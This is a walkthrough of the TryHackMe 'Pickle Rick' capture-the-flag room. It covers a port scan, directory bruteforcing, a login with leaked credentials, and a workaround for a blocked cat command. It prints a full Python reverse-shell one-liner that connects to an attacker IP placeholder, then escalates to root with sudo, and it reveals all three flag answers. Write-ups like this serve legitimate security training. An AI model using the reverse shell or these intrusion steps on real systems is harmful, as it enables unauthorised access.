Room: https://tryhackme.com/room/picklerick

After a scanning with nmap, we can see that ports 22 and 80 are open.  

Port 80 - is the website we're currently inspecting, at http://[machine_ip].  
Port 22 - is the SSH service running, which may be useful at a later time.

We can run a directory bruteforcing tool to scan the website, in order to discover hidden directories.   

Personally, I'll use gobuster, but dirbuster can be used as a GUI alternative.  

While the scan is running, I had a quick look at the main page's source code. We see that the developers left some notes for themselves.   

> Username: R1ckRul3s

In the meanwhile, the directory bruteforcing has finished. We found a few interesting results.  

First of all, the file robots.txt contains some (maybe) useful information: **Wubbalubbadubdub**  

Using the username found earlier and the text inside robots.txt we can log in as Rick in the /login.php page.  

There we find a command panel, the other links being unavaible. Using the **ls** command it returns the files inside the current directory.  

###### The output of **ls** command  

>Sup3rS3cretPickl3Ingred.txt  
>assets  
>clue.txt  
>denied.php  
>index.html  
>login.php  
>portal.php  
>robots.txt   

The downside is that the **cat** command is disabled.  

Using some bash, we can use __while read line; do echo $line; done <Sup3rS3cretPickl3Ingred.txt__  

The output of the file content is **mr. meeseek hair**, being the **first** flag we need for this CTF. **[1]**

We can read the **clue.txt** file using the same method as before.  
>Look around the file system for the other ingredient.

Since Python is installed on the remote machine, I used a python reverse shell and started a netcat listener on the attacking machine. 

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("MY_MACHINE_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```
* Use pty.spawn("/bin/bash") at the end for spawning a bash shell insdead of a sh. 

We get a reverse shell as www-data user. After checking the SUDO permissions, we see that this user has permission to run any command with sudo privileges, which makes it really easy for us to find the other two flags on the system.  

By using the **sudo su root** command, we can switch to the user **root**.  

The second **flag** is **1 jerry tear** and is located at **/home/rick**. **[2]**  

The third and final **flag** is **fleeb juice** and is located inside the **/root** directory. **[3]**
